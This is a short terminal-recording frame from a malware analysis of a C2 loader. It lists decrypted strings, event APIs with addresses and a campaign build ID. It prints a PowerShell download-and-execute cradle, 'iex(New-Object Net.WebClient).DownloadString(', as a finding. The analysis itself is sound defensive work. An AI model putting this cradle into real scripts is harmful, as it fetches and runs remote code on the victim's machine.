[0.000, "o", "\u001b[93mthe 270 decrypted plaintexts (checked by eye and by the script's IP/URL heuristics over the full list). The PowerShell cradle\r\niex(New-Object Net.WebClient).DownloadString(' @ 0x14007f140 carries\u001b[1m no embedded URL\u001b(B\u001b[m\u001b[93m — the download URL is supplied at runtime (C2 loader task).\r\n-\u001b[1m Mutex names: none in the table.\u001b(B\u001b[m\u001b[93m No Global\\/mutex-looking literal decrypts; CreateEventW @ 0x14007d7d8 / OpenEventW @ 0x14007d7c0 / ResetEvent @\r\n0x14007e390 are resolved, so single-instancing (if any) uses a\u001b[1m named event built at runtime\u001b(B\u001b[m\u001b[93m (likely from HWID/build ID), not a stored name — whoever\r\nworks #q-anti-analysis should trace the CreateEventW call site.\r\n-\u001b[1m Campaign/build ID:\u001b(B\u001b[m\u001b[93m 512e7bd984984fb6 — stored as a\u001b[1m plaintext\u001b(B\u001b[m\u001b[93m constant (not an RC4 blob, hence not in this table), set alongside the RC4 key by\r\ninit_rc4_key_and_strings @ 0x140001ee0 into DAT_1400b05f0 (see !61/!74). The build / (Build tokens in groups 5–6 are its protocol/report carriers.\r\n-\u001b[1m Pe\u001b(B\u001b[m"]
